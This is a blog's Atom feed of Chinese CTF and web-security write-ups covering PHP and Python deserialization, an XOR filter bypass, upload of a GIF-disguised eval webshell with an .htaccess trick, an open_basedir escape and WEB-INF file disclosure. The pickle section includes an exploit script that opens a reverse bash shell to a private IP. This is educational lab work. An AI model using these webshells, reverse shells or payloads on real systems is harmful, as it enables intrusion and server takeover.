<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-25T11:06:15.828Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[NPUCTF2020]ReadlezPHP</title>
    <link href="http://yoursite.com/2020/04/25/[NPUCTF2020]ReadlezPHP/"/>
    <id>http://yoursite.com/2020/04/25/[NPUCTF2020]ReadlezPHP/</id>
    <published>2020-04-25T11:06:15.827Z</published>
    <updated>2020-04-25T11:06:15.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>首先打开页面观看源码发现了有个隐藏的链接。</p><blockquote><p>/time.php?source</p></blockquote><p>进去后就发现了源码，很明显是PHP的反序列化漏洞。</p><pre><code class="php">&lt;?php#error_reporting(0);class HelloPhp{    public $a;    public $b;    public function __construct(){        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;        $this-&gt;b = &quot;date&quot;;    }    public function __destruct(){        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    }}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){    highlight_file(__FILE__);    die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]);</code></pre><p>构造PHP脚本。</p><pre><code class="PHP">&lt;?phpclass HelloPhp{    public $a;    public $b;}$c = new HelloPhp();$c-&gt;b = &#39;assert&#39;;$c-&gt;a = &#39;phpinfo();&#39;;$c_ser = serialize($c);print_r($c_ser);echo &quot;&lt;/br&gt;&quot;;</code></pre><blockquote><p>O:8:”HelloPhp”:2:{s:1:”a”;s:10:”phpinfo();”;s:1:”b”;s:6:”assert”;}</p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200425190223654.png" srcset="/img/loading.gif" alt="image-20200425190223654"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;NPUCTF2020-ReadlezPHP&quot;&gt;&lt;a href=&quot;#NPUCTF2020-ReadlezPHP&quot; class=&quot;headerlink&quot; title=&quot;[NPUCTF2020]ReadlezPHP&quot;&gt;&lt;/a&gt;[NPUCTF2020]ReadlezPHP
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache SSI 远程命令执行漏洞</title>
    <link href="http://yoursite.com/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-04-20T04:32:17.144Z</published>
    <updated>2020-04-20T04:32:17.144Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Apache SSI 远程命令执行漏洞&lt;/strong&gt;&lt;br&gt;链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yuzly/p/11226439.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[SUCTF 2019]EasyWeb</title>
    <link href="http://yoursite.com/2020/04/19/[SUCTF%202019]EasyWeb/"/>
    <id>http://yoursite.com/2020/04/19/[SUCTF%202019]EasyWeb/</id>
    <published>2020-04-19T07:37:26.166Z</published>
    <updated>2020-04-19T07:37:26.166Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easyweb" target="_blank" rel="noopener">题目源码</a></p><pre><code class="php">&lt;?phpfunction get_the_flag(){    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir)){    mkdir($userdir);    }    if(!empty($_FILES[&quot;file&quot;])){        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    }}$hhh = @$_GET[&#39;_&#39;];if (!$hhh){    highlight_file(__FILE__);}if(strlen($hhh)&gt;18){    die(&#39;One inch long, one inch strong!&#39;);}if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>这道题的第一个部分就是bypass这一道道的<code>if</code>语句，要满足所有条件需要</p><ul><li>$hhh的总长度超过18</li><li>需要绕过正则</li><li>需要满足字符串里面出现的字符种类数小于12</li></ul><p>长度的话我们可以构造一个<code>$_GET</code>的变量，然后再取给这个<code>$_GET</code>变量来传递参数就可以了。先用php脚本来看看还剩下哪些字符能够使用</p><pre><code class="php">&lt;?php$ascii=0;for(;$ascii&lt;256;){    if(!preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, chr($ascii))){        echo chr($ascii).&quot;:&quot;.$ascii.&quot;\n&quot;;    }    $ascii++;}    echo &quot;\n&quot;; ?&gt;</code></pre><p>这里面存在了<code>$</code>、<code>%</code>、<code>^</code>这样我们就可以利用字符之间的异或，来构造任意字符来满足我们想要的<code>$_GET</code>变量。</p><pre><code class="php">import stringguess = string.printable_ = []G = []E = []T = []for i in range(256):    for j in range(256):        if ((chr(i) not in guess) &amp; (chr(j) not in guess)):            res = i ^ j            if (chr(res) == &#39;_&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                _.append(result)            if (chr(res) == &#39;G&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                G.append(result)            if (chr(res) == &#39;E&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                E.append(result)            if (chr(res) == &#39;T&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                T.append(result)print(_,end=&quot;\n&quot;)print(G,end=&quot;\n&quot;)print(E,end=&quot;\n&quot;)print(T,end=&quot;\n&quot;)</code></pre><blockquote><p><strong>我们构造的Payload究竟是怎么样的?</strong></p><p><strong>现在已经知道了 Payload 需要由那些不可见字符组成</strong> , 那么 Payload 究竟是怎样的呢?</p><p>题目中有这么一条限制 : <strong>GET方法获取参数的值不能超过 18 个 字符</strong> , 如果想要在 Payload 中执行一个函数 , 格式肯定 <strong>(xxx^xxx)();</strong> 这样的 . 这还必须是无参函数 .</p><p><strong>但即使是无参函数 , 已经使用的字符( 小括号 , 异或符号 , … ) 也已经使用了6个字符 , 函数名又需要两两字符异或计算得到 , 也就是函数名最多有 ((18 - 6) / 2 = 6)个字符 , 而6个字符连个 phpinfo 都运行不了</strong> , 这样肯定是不可行的 .</p><p>直接调用函数好像是不可行的 , 我们需要换一种思路 —— <strong>比如使用全局变量 , 至少” $ “ 符号还是可以使用的</strong> , 介于<strong>题目中对 Payload 长度有限制</strong> , 最短的全局变量为 : <strong>$_GET</strong> . “ <code>$</code> “本身可用 , 而 <strong>_GET</strong> 的形式大概是 : <strong>{xxxx^xxxx}</strong> 这样的 .</p><p>有了全局变量 , 就可以利用 <strong>${} 中的代码是可以执行的特点</strong> ， 把要运行的函数名作为参数来动态执行 . 也就是<code>${x}();</code>这样的形式 , <strong>函数名的值 “ x “ 可以通过全局方法GET来获取</strong></p><p>因此 , 完整的 Payload 应该为 : <strong>Payload : ${xxxx^xxxx}{x}();&amp;x= …</strong> , 转换后就变成了 <strong>$_GET<a href="http://github.mrkaixin.computer/2019/06/05/BUUCTF做题笔记/" target="_blank" rel="noopener">x</a>;&amp;x= …</strong></p><p>并且 , <strong>“ _ “ 参数的值为 : ${xxxx^xxxx}(x)(); , 长度为 18 个字符 , 恰好满足题目 strlen() 函数的限制</strong></p><p>该函数限制” _ “参数值最多只能使用<strong>12</strong>个不同的字符 , 而现在 <code>${xxxx^xxxx}{x}();</code> 在不考虑 “ x “ 的情况下已经使用了 <strong>7</strong> 个字符了 , <strong>因此 x 最多只能使用 5 个不同的字符</strong></p><p>根据这个思路 , 可以在合理的情况下构造 Payload 了 , 这里以执行 phpinfo() 为例 , 构造 Payload 如下</p></blockquote><p>这个师傅写的特别的详细，点赞！</p><p>所以最后的payload:</p><pre><code class="php">_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=phpinfo</code></pre><p><a href="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" srcset="/img/loading.gif" alt="执行payload">执行payload</a></p><p>然后就是第二关了，我们可以看到源码里有一个<code>get_the_flag</code>函数，我们需要利用这个函数来上传一个shell，这个文件需要满足的要求是</p><ul><li>文件扩展名中不能出现<code>ph</code></li><li>并且文件中不能出现`</li><li>最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .</li></ul><p>不能出现<code>ph</code>的后缀文件，所以我们就不能直接上传<code>php</code>文件。</p><p>再一个我们从前面的phpinfo中得知题目的php的版本为php7，凑巧的是php7已经删除了<code></code>这种语法了，我们只能利用另外的骚操作</p><p>我的做法是，先上传一个文件，要求如下</p><ul><li>有文件头，可以被<code>exif_imagetype()</code>识别出是一个图片</li><li>里面有base64加密的代码</li></ul><pre><code class="php">shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)</code></pre><p>这里面的<code>\x00\x00\x47\x49\x46\x38\x39\x61</code>-&gt;<code>GIF89a</code>是GIF头，<code>b&quot;00&quot;</code>的作用：用来分割头和php代码。目的是防止之后解密base64解密的时候造成错误。</p><p><a href="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" srcset="/img/loading.gif" alt="shell源码">shell源码</a></p><p><a href="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" srcset="/img/loading.gif" alt="base64解密">base64解密</a></p><p>但是单单上传一个这个文件是不行的，所以我们需要<code>.htaccess</code>文件来帮助我们让服务器把这个文件解析成php代码，我们才能够真真的利用。</p><pre><code class="python">htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;&quot;&quot;&quot;</code></pre><p>这个后面的路径是上传完第一个shell文件之后产生的。</p><p>贴一下最后的代码</p><pre><code class="python">import requestsimport base64#题目链接url = &quot;http://73706c84-1992-4dba-adbd-b4f109b5b953.node2.buuoj.cn.wetolink.com:82/&quot;payload = &quot;?_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=get_the_flag&quot;shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;&quot;&quot;&quot;#先上传shell文件,在改路径上传.htaccess文件files = {&#39;file&#39;: (&#39;shell.aaa&#39;, shell, &#39;image/gif&#39;)}# files = {&#39;file&#39;: (&#39;.htaccess&#39;, htaccess, &#39;image/gif&#39;)}r = requests.post(url + payload, files=files)print(r.text)</code></pre><p><a href="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" srcset="/img/loading.gif" alt="操作过程">操作过程</a></p><p>但是有了shell，会发现可以读到当前目录下的文件，但是无法读到根目录下面的flag。</p><p>因为这里还需要绕过<code>open_basedir</code>这里直接给payload了，可以跟着这个<a href="https://www.jianshu.com/p/fbfeeb43ace2" target="_blank" rel="noopener">师傅的教程</a>动手做一下实验</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></pre><p><a href="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" srcset="/img/loading.gif" alt="读根目录文件">读根目录文件</a></p><p><a href="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" srcset="/img/loading.gif" alt="利用file_get_contents读取文件">利用file_get_contents读取文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SUCTF-2019-EasyWeb&quot;&gt;&lt;a href=&quot;#SUCTF-2019-EasyWeb&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]EasyWeb&quot;&gt;&lt;/a&gt;[SUCTF 2019]EasyWeb&lt;/h2&gt;&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python反序列化漏洞浅析</title>
    <link href="http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2020-04-09T02:17:58.000Z</published>
    <updated>2020-04-15T02:19:22.345Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。</p><p>主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。</p><p>引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞</p><p>此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数<strong>wakeup</strong></p><h3 id="0x02-Pickle模块"><a href="#0x02-Pickle模块" class="headerlink" title="0x02 Pickle模块"></a>0x02 Pickle模块</h3><ol><li><p>pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（list、dict、class等）转换为字符流，这个字符流包含反序列化（从字符流构建对象）所需的所有数据。</p></li><li><p>pickle有两个主要方法。第一个是dump-把对象导入到文件；第二个是load-从文件中加载对象。</p><p>实例</p><pre><code>import picklel1 = [&#39;data1&#39;,&#39;data2&#39;,&#39;data3&#39;, &#39;data4&#39;]file = open(&quot;testfile&quot;,&#39;wb&#39;) # 把l1保存到文件pickle.dump(l1, file)   file.close() ##############################################file = open(&quot;testfile&quot;,&#39;r&#39;)# 从文件中加载保存的对象l2 = pickle.load(file)  print(l2)# 输出: [&#39;data1&#39;, &#39;data2&#39;, &#39;data3&#39;]</code></pre></li><li><p>pickle instructions</p><pre><code>cossystem(S&#39;/bin/sh&#39;tR.</code></pre><blockquote><p>Pickle is a stack language which means that the pickle instructions push data onto the stack or pop data off of the stack and operate on it in some fashion. To understand how the canonical pickle works, we need only understand six pickle instructions:</p><ul><li><code>c</code>: Read to the newline as the module name, <code>module</code>. Read the next line as the object name, <code>object</code>. Push <code>module.object</code> onto the stack.</li><li><code>(</code>: Insert a marker object onto the stack. For our purpose, this is paired with <code>t</code> to produce a tuple.</li><li><code>t</code>: Pop objects off the stack until a <code>(</code> is popped and create a tuple object containing the objects popped (except for the <code>(</code>) in the order they were /pushed/ onto the stack. The tuple is pushed onto the stack</li><li><code>S</code>: Read the string in quotes up to the newline and push it onto the stack.</li><li><code>R</code>: Pop a tuple and a <a href="http://stackoverflow.com/questions/111234/what-is-a-callable-in-python" target="_blank" rel="noopener">callable</a> off the stack and call the callable with the tuple as arguments. Push the result onto the stack.</li><li><code>.</code>: End of the pickle.</li></ul></blockquote></li></ol><ul><li><p>c：读取新的一行作为模块名module，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</p></li><li><p>(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</p></li><li><p>t：从堆栈中弹出对象，直到一个“<code>(</code>”被弹出，并创建一个包含弹出对象（除了“<code>(</code>”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</p></li><li><p>S：读取引号中的字符串直到换行符处，然后将它压入堆栈。</p></li><li><p>R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</p></li><li><p>.：结束pickle。</p><p>说人话：</p></li><li><p>c：接下来的2行内容类似于，<code>os.system</code>、<code>urllib.unquote</code>是<code>module.object</code>的形式。</p></li><li><p>(：就是左括号</p></li><li><p>t：相当于右扩号</p></li><li><p>S：代表本行后面的内容是<code>String</code>，即字符串。</p></li><li><p>R：执行紧靠自己左边的一个括号对中的内容，即<code>(</code> 和他t直接的内容。</p></li><li><p>.：点号结束pickle。</p></li></ul><h3 id="0x03漏洞分析"><a href="#0x03漏洞分析" class="headerlink" title="0x03漏洞分析"></a>0x03漏洞分析</h3><p>类似于php的wakeup魔术方法，python中的<strong>reduce</strong>，可以在被反序列化的时候执行。具体内容请参考Python的官方库文档。而且并不止这一个函数。</p><p>如果序列化的内容可控，只需要将相应代码写入<strong>reduce</strong>函数中，接收端在反序列化的时候就会自动执行。</p><p>下面是一个简单的示例：</p><p>exp:</p><pre><code>import pickleimport subprocessclass m3lon(object):  def __reduce__(self):    return (subprocess.Popen,((&#39;cmd.exe&#39;,),))pickle.dumps(m3lon())# 输出：&quot;csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.&quot;</code></pre><p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p><p>下面模拟接收端</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" alt="img"></a></p><p>弹出shell！</p><h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p><p>app.py</p><pre><code>import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>exp.py</p><pre><code>#!/usr/bin/env python3import requestsimport pickleimport osimport base64class exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;        return (os.system, (s,))e = exp()s = pickle.dumps(e)response = requests.get(&quot;http://172.19.0.2:8000/&quot;, cookies=dict(    user=base64.b64encode(s).decode()))print(response.content)</code></pre><p><strong>分析</strong></p><p>反序列化的内容为user，通过cookie传输(用户可控)，于是pickle的反序列化漏洞便产生了，通过上面的exp可以查看我们生成的payload</p><pre><code>cposix\nsystem\np0\n(S\&#39;python -c \\\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.19.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);\\\&#39;\&#39;\np1\ntp2\nRp3\n.</code></pre><p>接收端在反序列化pickle.loads(user)过程中会自动执行<strong>reduce</strong>方法，弹出bash.</p><p><strong>流程</strong></p><p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" srcset="/img/loading.gif" alt="img"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WEB-INF</title>
    <link href="http://yoursite.com/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-06T08:31:58.000Z</published>
    <updated>2020-04-15T02:18:11.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"><a href="#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码" class="headerlink" title="WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"></a>WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</h2><h4 id="https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java"><a href="#https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java" class="headerlink" title="[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)"></a>[<a href="https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]</a>(<a href="https://buuoj.cn/challenges#[RoarCTF" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF</a> 2019]Easy Java)</h4><h3 id="首先看到一个页面-点击下help看看啥情况。"><a href="#首先看到一个页面-点击下help看看啥情况。" class="headerlink" title="首先看到一个页面,点击下help看看啥情况。"></a>首先看到一个页面,点击下help看看啥情况。</h3><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" srcset="/img/loading.gif" alt="img"></a></p><p>发现输出一串</p><pre><code>java.io.FileNotFoundException:{help.docx}</code></pre><p>可能是报错信息，打开Brup截取请求信息</p><pre><code>GET /Download?filename=help.docx HTTP/1.1Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</code></pre><p>通过查询发现要改成POST，得到许多有用信息</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" srcset="/img/loading.gif" alt="img"></a></p><pre><code>com.Wm.ctf.DownloadController.doPost</code></pre><p>这个信息跟CTF可能有关,记一下一般有这样都有泄露。</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" srcset="/img/loading.gif" alt="img"></a></p><h3 id="因为缺少JAVA项目的开发经验，所以查了大量的资料"><a href="#因为缺少JAVA项目的开发经验，所以查了大量的资料" class="headerlink" title="因为缺少JAVA项目的开发经验，所以查了大量的资料"></a>因为缺少JAVA项目的开发经验，所以查了大量的资料</h3><p>我们访问下WEB-INF/web.xml这个文件</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" srcset="/img/loading.gif" alt="img"></a></p><p>得到了个flag的路径!!!!</p><h2 id="插入一个知识点"><a href="#插入一个知识点" class="headerlink" title="插入一个知识点"></a>插入一个知识点</h2><pre><code>WEB-INF主要包含一下文件或目录:/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h2><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>base64解码得到flag</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" srcset="/img/loading.gif" alt="img"></a></p><h3 id="PS-GET不能读取文件有点懵，没想到居然要改成POST"><a href="#PS-GET不能读取文件有点懵，没想到居然要改成POST" class="headerlink" title="PS: GET不能读取文件有点懵，没想到居然要改成POST"></a>PS: GET不能读取文件有点懵，没想到居然要改成POST</h3>]]></content>
    
    <summary type="html">
    
      
      
